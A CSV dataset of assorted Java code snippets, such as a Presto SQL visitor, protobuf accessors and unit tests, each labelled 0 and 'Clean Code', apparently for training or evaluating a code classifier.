text,label,text_label
"private void visit(PrestoJoin join){
  visit(join.getLeftTable());
  sb.append("" "");
  sb.append(join.getJoinType());
  sb.append("" "");
  if (join.getOuterType() != null) {
    sb.append(join.getOuterType());
  }
  sb.append("" JOIN "");
  visit(join.getRightTable());
  if (join.getOnCondition() != null) {
    sb.append("" ON "");
    visit(join.getOnCondition());
  }
}
private void visit(PrestoConstant constant){
  sb.append(constant.toString());
}
private void visit(PrestoAtTimeZoneOperator timeZoneOperator){
  visit(timeZoneOperator.getExpr());
  sb.append("" AT TIME ZONE "");
  sb.append(timeZoneOperator.getTimeZone());
}
private void visit(PrestoFunctionWithoutParenthesis prestoFunctionWithoutParenthesis){
  sb.append(prestoFunctionWithoutParenthesis.getExpr());
}
private void visit(PrestoSelect select){
  sb.append(""SELECT "");
  if (select.isDistinct()) {
    sb.append(""DISTINCT "");
  }
  visit(select.getFetchColumns());
  sb.append("" FROM "");
  visit(select.getFromList());
  if (!select.getFromList().isEmpty() && !select.getJoinList().isEmpty()) {
    sb.append("", "");
  }
  if (!select.getJoinList().isEmpty()) {
    visit(select.getJoinList());
  }
  if (select.getWhereClause() != null) {
    sb.append("" WHERE "");
    visit(select.getWhereClause());
  }
  if (!select.getGroupByExpressions().isEmpty()) {
    sb.append("" GROUP BY "");
    visit(select.getGroupByExpressions());
  }
  if (select.getHavingClause() != null) {
    sb.append("" HAVING "");
    visit(select.getHavingClause());
  }
  if (!select.getOrderByClauses().isEmpty()) {
    sb.append("" ORDER BY "");
    visit(select.getOrderByClauses());
  }
  if (select.getLimitClause() != null) {
    sb.append("" LIMIT "");
    visit(select.getLimitClause());
  }
  if (select.getOffsetClause() != null) {
    sb.append("" OFFSET "");
    visit(select.getOffsetClause());
  }
}
public void visit(PrestoCastFunction cast){
  sb.append(""CAST(("");
  visit(cast.getExpr());
  sb.append("") AS "");
  sb.append(cast.getType().toString());
  sb.append("")"");
}
public void visit(PrestoMultiValuedComparison comp){
  sb.append(""("");
  visit(comp.getLeft());
  sb.append("" "");
  sb.append(comp.getOp().getStringRepresentation());
  sb.append("" "");
  sb.append(comp.getType());
  sb.append("" (VALUES "");
  visit(comp.getRight());
  sb.append("")"");
  sb.append("")"");
}
public void visit(PrestoQuantifiedComparison comp){
  sb.append(""("");
  visit(comp.getLeft());
  sb.append("" "");
  sb.append(comp.getOp().getStringRepresentation());
  sb.append("" "");
  sb.append(comp.getType());
  sb.append("" ( "");
  visit(comp.getRight());
  sb.append("" ) "");
  sb.append("")"");
}
",0,Clean Code
"public static Info process(Node x){
  if (x == null) {
    return null;
  }
  Info leftInfo=process(x.left);
  Info rightInfo=process(x.right);
  int max=x.value;
  if (leftInfo != null) {
    max=Math.max(max,leftInfo.max);
  }
  if (rightInfo != null) {
    max=Math.max(max,rightInfo.max);
  }
  int min=x.value;
  if (leftInfo != null) {
    min=Math.min(min,leftInfo.min);
  }
  if (rightInfo != null) {
    min=Math.min(min,rightInfo.min);
  }
  boolean isBST=true;
  if (leftInfo != null && !leftInfo.isBST) {
    isBST=false;
  }
  if (rightInfo != null && !rightInfo.isBST) {
    isBST=false;
  }
  if (leftInfo != null && leftInfo.max >= x.value) {
    isBST=false;
  }
  if (rightInfo != null && rightInfo.min <= x.value) {
    isBST=false;
  }
  return new Info(isBST,max,min);
}
",0,Clean Code
"@Override public GetFarmStageGachaInfoScRsp clone(){
  return new GetFarmStageGachaInfoScRsp().copyFrom(this);
}
",0,Clean Code
"@Override public final int read(byte[] buffer,int offset,int readLength) throws IOException {
  Assertions.checkState(sourceOpened);
  while (true) {
    if (currentSegmentIndex == fakeData.getSegments().size() || bytesRemaining == 0) {
      return C.RESULT_END_OF_INPUT;
    }
    Segment current=fakeData.getSegments().get(currentSegmentIndex);
    if (current.isErrorSegment()) {
      if (!current.exceptionCleared) {
        current.exceptionThrown=true;
        throw (IOException)current.exception.fillInStackTrace();
      }
 else {
        currentSegmentIndex++;
      }
    }
 else     if (current.isActionSegment()) {
      currentSegmentIndex++;
      current.action.run();
    }
 else {
      readLength=(int)Math.min(readLength,bytesRemaining);
      readLength=Math.min(readLength,current.length - current.bytesRead);
      Assertions.checkArgument(buffer.length - offset >= readLength);
      if (current.data != null) {
        System.arraycopy(current.data,current.bytesRead,buffer,offset,readLength);
      }
      onDataRead(readLength);
      bytesTransferred(readLength);
      bytesRemaining-=readLength;
      current.bytesRead+=readLength;
      if (current.bytesRead == current.length) {
        currentSegmentIndex++;
      }
      return readLength;
    }
  }
}",0,Clean Code
"private void loadLastUnreadMention(){
}
",0,Clean Code
"@Override public boolean checkConfigKeyUnique(SysConfigEntity config){
  Long configId=StringUtils.isNull(config.getConfigId()) ? -1L : config.getConfigId();
  SysConfigEntity info=configMapper.checkConfigKeyUnique(config);
  if (StringUtils.isNotNull(info) && info.getConfigId().longValue() != configId.longValue()) {
    return false;
  }
  return true;
}",0,Clean Code
"/** 
 * Search for workflows based on payload
 * @param query the search query
 * @return the {@link SearchResult} containing the {@link WorkflowSummary} that match the query
 */
public SearchResult<WorkflowSummary> search(String query){
  return search(null,null,null,null,query);
}
/** 
 * Paginated search for workflows based on payload
 * @param start start value of page
 * @param size number of workflows to be returned
 * @param sort sort order
 * @param freeText additional free text query
 * @param query the search query
 * @return the {@link SearchResult} containing the {@link WorkflowSummary} that match the query
 */
public SearchResult<WorkflowSummary> search(@Nullable Integer start,@Nullable Integer size,@Nullable String sort,@Nullable String freeText,@Nullable String query){
  SearchPb.Request searchRequest=createSearchRequest(start,size,sort,freeText,query);
  WorkflowServicePb.WorkflowSummarySearchResult result=stub.search(searchRequest);
  return new SearchResult<>(result.getTotalHits(),result.getResultsList().stream().map(protoMapper::fromProto).collect(Collectors.toList()));
}
",0,Clean Code
"public GGProVoiceQueueCfg(GProVoiceQueueCfg gProVoiceQueueCfg){
  this.mInfo=gProVoiceQueueCfg;
}
",0,Clean Code
"OllamaDockerImageName(String baseImage,String localImageName){
  this.baseImage=baseImage;
  this.localImageName=localImageName;
}
",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.math.protos.AdaGradRDADenseTensorProto)) {
    return super.equals(obj);
  }
  org.tribuo.math.protos.AdaGradRDADenseTensorProto other=(org.tribuo.math.protos.AdaGradRDADenseTensorProto)obj;
  if (hasData() != other.hasData())   return false;
  if (hasData()) {
    if (!getData().equals(other.getData()))     return false;
  }
  if (java.lang.Double.doubleToLongBits(getLearningRate()) != java.lang.Double.doubleToLongBits(other.getLearningRate()))   return false;
  if (java.lang.Double.doubleToLongBits(getEpsilon()) != java.lang.Double.doubleToLongBits(other.getEpsilon()))   return false;
  if (java.lang.Double.doubleToLongBits(getL1()) != java.lang.Double.doubleToLongBits(other.getL1()))   return false;
  if (java.lang.Double.doubleToLongBits(getL2()) != java.lang.Double.doubleToLongBits(other.getL2()))   return false;
  if (!getGradNorms().equals(other.getGradNorms()))   return false;
  if (getIteration() != other.getIteration())   return false;
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}",0,Clean Code
"/** 
 * <code>repeated .Quest quest_list = 10;</code> This method returns the internal storage object and sets the corresponding has state. The returned object will become part of this message and its contents may be modified as long as the has state is not cleared.
 * @return internal storage object for modifications
 */
public RepeatedMessage<QuestOuterClass.Quest> getMutableQuestList(){
  bitField0_|=0x00000004;
  return questList;
}",0,Clean Code
"@Override public UnlockPhoneThemeScNotify clone(){
  return new UnlockPhoneThemeScNotify().copyFrom(this);
}
",0,Clean Code
"public ZyEdgeRealizer(final ZyLabelContent content,final IEdgeRealizerUpdater<EdgeType> updater){
  Preconditions.checkNotNull(content,""Internal Error: Content cannot be null"");
  m_content=content;
  setArrow(Arrow.STANDARD);
  setSmoothedBends(true);
  if (content.getLineCount() > 0) {
    addLabel(new ZyEdgeLabel(content));
  }
  setUpdater(updater);
}",0,Clean Code
"/** 
 * @return a new empty instance of {@code RogueAchivedMiracleInfo}
 */
public static RogueAchivedMiracleInfo newInstance(){
  return new RogueAchivedMiracleInfo();
}
",0,Clean Code
"@Test public void test4(){
  MySqlCreateTableStatement x=new MySqlCreateTableStatement();
  x.setTableName(""ff"");
  x.setComment(new MySqlCharExpr(null));
  SQLColumnDefinition c=new SQLColumnDefinition();
  x.addColumn(c);
  c.setName(""name"");
  SQLDataTypeImpl sqlDataType=new SQLDataTypeImpl();
  sqlDataType.setName(""varchar(32)"");
  c.setDataType(sqlDataType);
  c.addConstraint(new SQLNotNullConstraint());
  c.setComment(new MySqlCharExpr(""xname""));
  log.info(x.toString());
}",0,Clean Code
"@Override public SyncDeleteFriendScNotify create(){
  return SyncDeleteFriendScNotify.newInstance();
}
",0,Clean Code
"@Override public ActionResult deleteWithPermission(Long id){
  DataSource dataSource=queryExistent(id,null).getData();
  PermissionUtils.checkOperationPermission(dataSource.getUserId());
  getMapper().deleteById(id);
  LambdaQueryWrapper<DataSourceAccessDO> dataSourceAccessQueryWrapper=new LambdaQueryWrapper<>();
  dataSourceAccessQueryWrapper.eq(DataSourceAccessDO::getDataSourceId,id);
  getAccessMapper().delete(dataSourceAccessQueryWrapper);
  return ActionResult.isSuccess();
}
",0,Clean Code
"public long getUserId(){
  return this.userId;
}
",0,Clean Code
"@Override public MemoryBuffer getBuffer(){
  return MemoryBuffer.this;
}
",0,Clean Code
"long getNextPos();
",0,Clean Code
"/** 
 * <code>repeated .ChessRogueItemInfo.ItemsEntry items = 4;</code> This method returns the internal storage object and sets the corresponding has state. The returned object will become part of this message and its contents may be modified as long as the has state is not cleared.
 * @return internal storage object for modifications
 */
public RepeatedMessage<ItemsEntry> getMutableItems(){
  bitField0_|=0x00000001;
  return items;
}",0,Clean Code
"public static DestroyItemCsReq parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new DestroyItemCsReq(),data).checkInitialized();
}
public static DestroyItemCsReq parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new DestroyItemCsReq(),input).checkInitialized();
}
public static DestroyItemCsReq parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new DestroyItemCsReq(),input).checkInitialized();
}
",0,Clean Code
"@Override public String toString(){
  return ""QueryEmpInsuranceMonthVO{"" + ""employeeId="" + employeeId + "", employeeName='""+ employeeName+ '\''+ "", mobile='""+ mobile+ '\''+ "", entryTime=""+ entryTime+ "", deptName='""+ deptName+ '\''+ "", city='""+ city+ '\''+ "", schemeName='""+ schemeName+ '\''+ "", personalInsuranceAmount=""+ personalInsuranceAmount+ "", personalProvidentFundAmount=""+ personalProvidentFundAmount+ "", corporateInsuranceAmount=""+ corporateInsuranceAmount+ "", corporateProvidentFundAmount=""+ corporateProvidentFundAmount+ '}';
}
",0,Clean Code
"/** 
 * @return The model id.
 */
public String id(){
  return this.id;
}
",0,Clean Code
"private static H2DataType getColumnType(String columnType){
  if (columnType.startsWith(""INTEGER"") || columnType.startsWith(""SMALLINT"") || columnType.startsWith(""TINYINT"")|| columnType.startsWith(""BIGINT"")) {
    return H2DataType.INT;
  }
 else   if (columnType.startsWith(""BOOLEAN"")) {
    return H2DataType.BOOL;
  }
 else   if (columnType.startsWith(""CHARACTER VARYING"")) {
    return H2DataType.VARCHAR;
  }
 else   if (columnType.startsWith(""DOUBLE"") || columnType.startsWith(""DECFLOAT"") || columnType.startsWith(""REAL"")|| columnType.startsWith(""FLOAT"")) {
    return H2DataType.DOUBLE;
  }
 else   if (columnType.startsWith(""NUMERIC"")) {
    return H2DataType.INT;
  }
 else   if (columnType.contentEquals(""NULL"")) {
    return H2DataType.INT;
  }
 else   if (columnType.startsWith(""BINARY"")) {
    return H2DataType.BINARY;
  }
 else {
    throw new AssertionError(columnType);
  }
}",0,Clean Code
"private void handleToggle(int old_pos,boolean checked){
  AppDescriptor app=getItem(old_pos);
  String packageName=app.getPackageName();
  if (checked == mCheckedItems.contains(packageName))   return;
  if (checked)   mCheckedItems.add(packageName);
 else   mCheckedItems.remove(packageName);
  if (mListener != null)   mListener.onAppToggled(app,checked);
  List<AppDescriptor> apps=getApps();
  int new_pos=old_pos;
  for (int i=0; i < apps.size(); i++) {
    AppDescriptor other=apps.get(i);
    if ((i != old_pos) && compareCheckedFirst(app,other) <= 0) {
      new_pos=i;
      break;
    }
  }
  if (new_pos > old_pos)   new_pos--;
  Log.d(TAG,""Item @"" + old_pos + "": ""+ (checked ? ""checked"" : ""unchecked"")+ "" -> ""+ new_pos);
  notifyItemChanged(old_pos);
  if (new_pos != old_pos) {
    apps.remove(old_pos);
    apps.add(new_pos,app);
    notifyItemMoved(old_pos,new_pos);
    if (mRecyclerView != null) {
      if (checked)       mRecyclerView.scrollToPosition(new_pos);
 else       mRecyclerView.scrollToPosition(old_pos);
    }
  }
}",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.protos.core.RealInfoProto)) {
    return super.equals(obj);
  }
  org.tribuo.protos.core.RealInfoProto other=(org.tribuo.protos.core.RealInfoProto)obj;
  if (!getName().equals(other.getName()))   return false;
  if (getCount() != other.getCount())   return false;
  if (java.lang.Double.doubleToLongBits(getMax()) != java.lang.Double.doubleToLongBits(other.getMax()))   return false;
  if (java.lang.Double.doubleToLongBits(getMin()) != java.lang.Double.doubleToLongBits(other.getMin()))   return false;
  if (java.lang.Double.doubleToLongBits(getMean()) != java.lang.Double.doubleToLongBits(other.getMean()))   return false;
  if (java.lang.Double.doubleToLongBits(getSumSquares()) != java.lang.Double.doubleToLongBits(other.getSumSquares()))   return false;
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"public void cancelUploadWallpaper(){
  if (uploadingWallpaperInfo != null) {
    if (uploadingWallpaperInfo.requestIds != null) {
      for (int i=0; i < uploadingWallpaperInfo.requestIds.size(); i++) {
        ConnectionsManager.getInstance(currentAccount).cancelRequest(uploadingWallpaperInfo.requestIds.get(i),true);
      }
    }
    FileLoader.getInstance(currentAccount).cancelFileUpload(uploadingWallpaper,false);
    if (uploadingWallpaperInfo.dialogId != 0) {
      if (uploadingWallpaperInfo.dialogId >= 0) {
        TLRPC.UserFull userFull=getUserFull(uploadingWallpaperInfo.dialogId);
        if (userFull != null) {
          userFull.wallpaper=uploadingWallpaperInfo.prevUserWallpaper;
          NotificationCenter.getInstance(currentAccount).postNotificationName(NotificationCenter.userInfoDidLoad,uploadingWallpaperInfo.dialogId,userFull);
        }
      }
 else {
        TLRPC.ChatFull chatFull=getChatFull(-uploadingWallpaperInfo.dialogId);
        if (chatFull != null) {
          chatFull.wallpaper=uploadingWallpaperInfo.prevUserWallpaper;
          NotificationCenter.getInstance(currentAccount).postNotificationName(NotificationCenter.chatInfoDidLoad,chatFull,0,false,false);
        }
      }
    }
    uploadingWallpaperInfo=null;
    uploadingWallpaper=null;
  }
}",0,Clean Code
"/** 
 * <code>optional string msg = 6;</code>
 * @return internal {@code Utf8String} representation of msg for modifications
 */
public Utf8String getMutableMsgBytes(){
  bitField0_|=0x00000020;
  return this.msg;
}",0,Clean Code
"@Override public void changedY(final CBend bend,final double y){
  final int index=m_rawEdge.getBends().indexOf(bend);
  final Bend rbend=m_realizer.getBend(index);
  rbend.setLocation(rbend.getX(),y);
}
",0,Clean Code
"@Test void should_find_relevant_with_filter(){
  TextSegment segment=TextSegment.from(""this segment should be found"",Metadata.from(""test-key"",""test-value""));
  Embedding embedding=embeddingModel.embed(segment.text()).content();
  TextSegment filterSegment=TextSegment.from(""this segment should not be found"",Metadata.from(""test-key"",""no-value""));
  Embedding filterEmbedding=embeddingModel.embed(filterSegment.text()).content();
  List<String> ids=embeddingStore.addAll(asList(embedding,filterEmbedding),asList(segment,filterSegment));
  assertThat(ids).hasSize(2);
  TextSegment refSegment=TextSegment.from(""find a segment"");
  Embedding refEmbedding=embeddingModel.embed(refSegment.text()).content();
  awaitUntilPersisted();
  List<EmbeddingMatch<TextSegment>> relevant=embeddingStore.findRelevant(refEmbedding,2);
  assertThat(relevant).hasSize(1);
  EmbeddingMatch<TextSegment> match=relevant.get(0);
  assertThat(match.score()).isCloseTo(0.88,withPercentage(1));
  assertThat(match.embeddingId()).isEqualTo(ids.get(0));
  assertThat(match.embedding()).isEqualTo(embedding);
  assertThat(match.embedded()).isEqualTo(segment);
}",0,Clean Code
